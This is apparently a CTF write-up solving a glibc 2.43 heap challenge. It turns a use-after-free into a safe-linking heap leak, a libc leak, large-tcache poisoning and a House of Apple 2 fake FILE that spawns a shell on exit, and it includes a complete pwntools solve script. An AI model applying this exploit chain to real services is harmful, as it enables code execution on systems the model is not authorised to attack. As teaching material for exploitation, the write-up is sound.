---
title: "Blessed are the Heap Makers"
date: 2026-08-22
description: 'Turning a dangling heap pointer into a glibc House of Apple 2 exploit.'
category: '$n1phers-3-0-ctf'
discipline: 'binary-exploitation'
authors: ['abdieeuh']
draft: false
---

## Challenge Overview

This is a heap exploitation challenge with a small malloc menu and a bundled glibc 2.43.

The exploit chain is:

1. Use the dangling pointer after free() for a safe-linking heap leak.
2. Forge a chunk and transition it from tcache to the unsorted bin.
3. Derive the libc base from the main_arena + 8 pointer.
4. Use large-tcache exact-size checks to redirect allocations into writable libc.
5. Overwrite _IO_list_all with a House of Apple 2 fake FILE.
6. Trigger system(" sh") during glibc stream cleanup and read the flag.

## Challenge Features

| Feature | Security relevance |
|---|---|
| Freed pointers remain in chunks[] | edit() and show() become UAF primitives. |
| Freed sizes remain in sizes[] | The program continues reading and writing the stale chunk size. |
| Safe-linking | Tcache poisoning needs the leaked heap key. |
| glibc 2.43 large tcache | The forged chunk sizes must match the allocator's exact lookup behavior. |
| Full RELRO, NX, canary, SHSTK, and IBT | A normal GOT overwrite or simple ROP path is not available. |
| Exit-time stdio cleanup | A fake wide-oriented FILE can redirect the final control flow. |

The local artifact has these mitigations:

~~~text
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
SHSTK:      Enabled
IBT:        Enabled
~~~

The Dockerfile sets the same tcache limit used by the service:

~~~text
JAIL_ENV_GLIBC_TUNABLES=glibc.malloc.tcache_max=0x1000
~~~

## Attack Vector

| Input | Verified role |
|---|---|
| Allocation size | Selects the required large-tcache size class. |
| Index after delete() | References the freed allocation because the pointer is not cleared. |
| show() on a freed index | Leaks safe-linking metadata and later libc pointers. |
| edit() on a freed index | Overwrites tcache metadata, fake chunk headers, and libc data. |
| Invalid menu choice | Calls die(), which exits and causes glibc to flush the forged stdio list. |

## Root Cause

### Main Trigger: dangling chunk metadata

The relevant behavior in delete() is effectively:

~~~c
free(chunks[idx]);
// chunks[idx] and sizes[idx] are not cleared
~~~

There is no live-allocation check in edit() or show(). Once a chunk is freed, its tcache metadata is still reachable through the menu.

### Read Primitive: UAF show()

After freeing a chunk, the first qword is the safe-linking key:

~~~python
heap_key = u64(show(1, 0x7a0)[:8])
heap_base = heap_key << 12
~~~

Later, the same stale read exposes the unsorted-bin pointer used to derive libc.

### Write Primitive: UAF edit()

The stale pointer can also be edited. This is enough to write:

- an encoded tcache next pointer;
- fake size fields at a chunk header;
- a complete fake FILE, wide-data object, and vtable in writable libc.

## Exploitation

### 1. Deterministic heap layout

A first 0x420 allocation is freed to initialize tcache. The next allocations are:

~~~python
create(1, 0x7a0)
create(2, 0x7b0)
delete(1)
~~~

For this allocation sequence, the leaked heap key gives a base from which the relevant addresses are fixed:

~~~text
A = heap_base + 0x740
B = heap_base + 0xef0
F = B + 0x10
~~~

B is used as the fake chunk header. The freed A entry is poisoned with safe-linking:

~~~python
edit(2, p64(0) + p64(0x7d1) + p64(F >> 12))
edit(1, p64((A >> 12) ^ F))
create(3, 0x7c0)
~~~

The allocation at index 3 now returns F. A live guard allocation is placed after it so that the forged chunk has a controlled successor.

### 2. Unsorted-bin libc leak

The forged chunk is repeatedly freed while its tcache key is cleared. The loop is not blind brute force: it checks the freed qword and stops only when the observed value has become a libc pointer.

~~~python
delete(3)
for _ in range(30):
    data = show(3, 0x7c0)
    qword = u64(data[:8])
    if qword > 0x700000000000:
        unsorted = qword
        break
    edit(3, p64(qword) + p64(0))
    delete(3)
else:
    raise RuntimeError("tcache did not transition to unsorted")
~~~

For the bundled glibc, the unsorted pointer is main_arena + 8:

~~~python
libc_base = unsorted - 0x212ac8
~~~

This is an observed leak followed by a fixed symbol-relative calculation.

### 3. Large-tcache poisoning into libc

The next destinations are writable locations in libc:

~~~python
T = libc_base + 0x212220
Y = T + 0x7f0
Z = Y + 0x80
~~~

The chain is:

~~~text
F -> T -> Y -> Z
~~~

The allocator is made to skip a stale tcache entry by changing its fake chunk size after insertion. The poisoned link then points to the next destination.

| Stage | Fake size | Result |
|---|---:|---|
| F | 0x800 | The large-tcache lookup skips F and returns T. |
| T | 0xff0 | The next controlled allocation returns Y. |
| Y | 0x1010 | The final controlled allocation returns Z. |

The final write is 0x1000 bytes. Its endpoint is exact:

~~~text
_IO_list_all = libc_base + 0x213480
_IO_list_all - Z = 0x9f0
~~~

### 4. House of Apple 2

The final payload places the fake structures inside the 0x1000-byte region at Z:

| Object | Address |
|---|---|
| Fake FILE | Z + 0x100 |
| Fake wide data | Z + 0x300 |
| Fake wide vtable | Z + 0x500 |
| Fake lock | Z + 0x700 |

The important pointers are:

~~~text
_IO_list_all       -> fake FILE
FILE vtable        -> libc + 0x211228 (_IO_wfile_jumps)
FILE _wide_data    -> fake wide data
wide vtable + 0x68 -> libc + 0x5c560 (system)
FILE start         -> " sh\0"
~~~

When the program exits, glibc follows:

~~~text
_IO_flush_all
  -> _IO_wfile_overflow
  -> _IO_wdoallocbuf
  -> fake wide vtable
  -> system(" sh")
~~~

The call was confirmed locally in gdb with the fake FILE address in rdi. The resulting shell reads the challenge's /app/flag.txt.

## Final Solve Script

~~~python
#!/usr/bin/env python3
from pwn import *
import os

context.binary = ELF("./peacemakers", checksec=False)
context.timeout = 3


def start():
    if args.REMOTE:
        host, port = args.REMOTE.split(":", 1)
        return remote(host, int(port))

    path = "./peacemakers"
    return process([path], env={"GLIBC_TUNABLES": "glibc.malloc.tcache_max=0x1000"})


io = start()


def create(idx, size):
    io.sendlineafter(b"choice > ", b"1")
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.sendlineafter(b"size > ", str(size).encode())
    io.recvuntil(b"Allocated")


def delete(idx):
    io.sendlineafter(b"choice > ", b"2")
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.recvuntil(b"Freed")


def edit(idx, data):
    io.sendlineafter(b"choice > ", b"3")
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.sendafter(b"Data: ", data)
    io.recvuntil(b"Updated")


def show(idx, size):
    io.sendlineafter(b"choice > ", b"4")
    io.sendlineafter(b"idx > ", str(idx).encode())
    io.recvuntil(b"DATA_BEGIN{")
    data = io.recvn(size)
    io.recvuntil(b"}DATA_END")
    io.recvuntil(b"Done!\n")
    return data


# A first allocation/free initializes glibc's tcache.  Its request is in a
# different large-tcache bin from the forged source below.
create(0, 0x420)
delete(0)

A_REQ = 0x7A0
B_REQ = 0x7B0
F_REQ = 0x7C0
GUARD_REQ = 0x7D0
LIBC_REQ = 0x7F0

create(1, A_REQ)
create(2, B_REQ)
delete(1)

# The first qword of a freed tcache chunk is heap_key = user_ptr >> 12.
heap_key = u64(show(1, A_REQ)[:8])
heap_base = heap_key << 12

# With the deterministic 0x420 initializer, tcache's 0x300-byte allocation
# sits between the initializer and A.
A = heap_base + 0x740
B = heap_base + 0xEF0
F = B + 0x10

# F is initially a fake 0x7D0-byte chunk, which is the exact size requested
# by F_REQ.  The poisoned A entry is smaller and is skipped by large tcache.
edit(2, p64(0) + p64(0x7D1) + p64(F >> 12))
edit(1, p64((A >> 12) ^ F))
create(3, F_REQ)

# The physical distance from fake header B to the top is A's actual size,
# 0x7B0.  The live guard is allocated immediately after that fake chunk.
edit(2, p64(0) + p64(0x7B1))
create(4, GUARD_REQ)

# Re-free F while clearing the tcache key.  The observed libc pointer marks
# the first normal/unsorted free; the loop is state-detecting, not guessed.
delete(3)
for _ in range(30):
    data = show(3, F_REQ)
    qword = u64(data[:8])
    if qword > 0x700000000000:
        unsorted = qword
        break
    edit(3, p64(qword) + p64(0))
    delete(3)
else:
    raise RuntimeError("tcache did not transition to unsorted")

libc_base = unsorted - 0x212AC8
T = libc_base + 0x212220
Y = T + 0x7F0
Z = Y + 0x80

# Put F in the 0x800 (bin 65) tcache bin.  Lowering its size after insertion
# makes tcache_get_large skip it and follow its poisoned next pointer to T.
edit(2, p64(0) + p64(0x801))
edit(3, p64(0) + p64(0))
delete(3)
edit(2, p64(0) + p64(0x7F1))
edit(3, p64((F >> 12) ^ T) + p64(0))
create(5, LIBC_REQ)

# The skipped F node would otherwise retain an arbitrary decoded tail from
# T's original libc qword.  Repair it before reusing the bin.
edit(3, p64(F >> 12) + p64(0))

# T is writable libc.  Its fake successor Y has exact size 0xFF0, still in
# the same large-tcache bin, and gives a longer write window.
t_data = bytearray(show(5, LIBC_REQ))
t_data[0x7E8:0x7F0] = p64(0xFF1)
edit(5, bytes(t_data))
delete(5)
edit(5, p64((T >> 12) ^ Y) + p64(0))
create(6, 0xFE0)

# Move once more to bin 66.  Z is aligned and its qword at Z-8 is writable
# through Y; the final 0x1000-byte write reaches _IO_list_all exactly.
y_data = bytearray(show(6, 0xFE0))
y_data[0x70:0x80] = p64(0) + p64(0x1011)
edit(6, bytes(y_data))

t_data = bytearray(show(5, LIBC_REQ))
t_data[0x7E8:0x7F0] = p64(0x1011)
edit(5, bytes(t_data))
delete(6)

t_data = bytearray(show(5, LIBC_REQ))
t_data[0x7E8:0x7F0] = p64(0xFF1)
edit(5, bytes(t_data))
edit(6, p64((Y >> 12) ^ Z) + p64(0))
create(7, 0x1000)

# House of Apple 2: _IO_list_all -> fake FILE -> _IO_wfile_overflow ->
# _IO_wdoallocbuf -> fake wide vtable -> system(FILE), where FILE starts
# with the command " sh".
z_data = bytearray(show(7, 0x1000))
file_addr = Z + 0x100
wide_addr = Z + 0x300
wide_vtable = Z + 0x500
lock_addr = Z + 0x700

for start_off, end_off in ((0x100, 0x300), (0x300, 0x500), (0x500, 0x600)):
    z_data[start_off:end_off] = b"\0" * (end_off - start_off)


def put(addr, value):
    offset = addr - Z
    z_data[offset:offset + len(value)] = value


put(file_addr, b" sh\0" + b"\0" * 4)
put(file_addr + 0x28, p64(1))
put(file_addr + 0x68, p64(0))
put(file_addr + 0x70, p32(0xFFFFFFFF))
put(file_addr + 0x74, p32(0))
put(file_addr + 0x78, p64(0xFFFFFFFFFFFFFFFF))
put(file_addr + 0x88, p64(lock_addr))
put(file_addr + 0xA0, p64(wide_addr))
put(file_addr + 0xC0, p64(1))
put(file_addr + 0xD8, p64(libc_base + 0x211228))
put(wide_addr + 0x18, p64(0))
put(wide_addr + 0x20, p64(1))
put(wide_addr + 0x30, p64(0))
put(wide_addr + 0xE0, p64(wide_vtable))
put(wide_vtable + 0x68, p64(libc_base + 0x5C560))
put(lock_addr, p64(0))
put(Z + 0x9F0, p64(file_addr))

edit(7, bytes(z_data))
io.sendlineafter(b"choice > ", b"9")
sleep(1)
flag_path = b"/app/flag.txt" if args.REMOTE else b"flag.txt"
io.sendline(b"cat " + flag_path + b"; exit")
print(io.recvrepeat(3).decode(errors="replace"), end="")
~~~

## Verified Output

The remote service returned:

~~~text
$N1PH€RSxTCTF{h0p3_Y0u_l34rN3D_4_8i7_480U7_l47357_GLIBC_2_43_95a45b8}
~~~

## Flag

~~~text
$N1PH€RSxTCTF{h0p3_Y0u_l34rN3D_4_8i7_480U7_l47357_GLIBC_2_43_95a45b8}
~~~
